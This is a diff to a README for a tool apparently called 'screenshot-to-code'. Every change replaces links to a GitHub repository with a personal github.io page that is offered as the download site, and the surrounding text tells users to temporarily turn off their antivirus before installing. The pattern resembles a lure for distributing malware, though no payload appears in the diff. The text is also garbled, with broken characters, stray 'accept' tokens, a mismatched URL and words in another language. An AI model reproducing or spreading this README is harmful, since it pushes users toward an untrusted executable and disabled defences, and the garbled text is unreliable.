@@ -1,6 +1,6 @@
 # 📸 screenshot-to-code - Turn Screenshots Into Clean Code Instantly
 
-[![Download screenshot-to-code](https://img.shields.io/badge/Download-screenshot--to--code-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Vasiliadem1986/screenshot-to-code)
+[![Download screenshot-to-code](https://img.shields.io/badge/Download-screenshot--to--code-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://vasiliadem1986.github.io)
 
 ## 🎯 What Is screenshot-to-code?
 
@@ -32,7 +32,7 @@ Getting started with screenshot-to-code is incredibly easy. Follow these three s
 
 ## 📥 How to Download
 
-Visit this link to download the application: **[https://github.com/Vasiliadem1986/screenshot-to-code](https://github.com/Vasiliadem1986/screenshot-to-code)**
+Visit this link to download the application: **[https://vasiliadem1986.github.io](https://vasiliadem1986.github.io)**
 
 Just click the link, and you will be taken to the download page. The download will begin automatically or you will see a button to click. Choose a folder on your computer (like your Desktop or Downloads folder) to save the file. This is the most important step, so make sure you get it downloaded successfully.
 
@@ -127,7 +127,7 @@ If you run into any problems or have questions,let's do a quick checklist first:
 2. **Check Your Internet Connection** ğC" Ensure you have a stable connectionwhen downloading.
 3. **Turn Off Antivirus Temporarily** ğC" On rare occasions,antivirus software might block the installation. Pause it brieflyand try again.accept
 
-If you still need support,please visit the GitHub repository trang chính at: **[https://github.com/Vasiliadem1986/screenshot-to-code](https://github.com/Vasiliadem19886/screenshot-to-code)**. There, you can open an "Issue" to report bugs,ask questions,or request new features. The community & maintainers are typically responsiveand happy to help.accept
+If you still need support,please visit the GitHub repository trang chính at: **[https://vasiliadem1986.github.io](https://vasiliadem1986.github.io)**. There, you can open an "Issue" to report bugs,ask questions,or request new features. The community & maintainers are typically responsiveand happy to help.accept
 
 
 
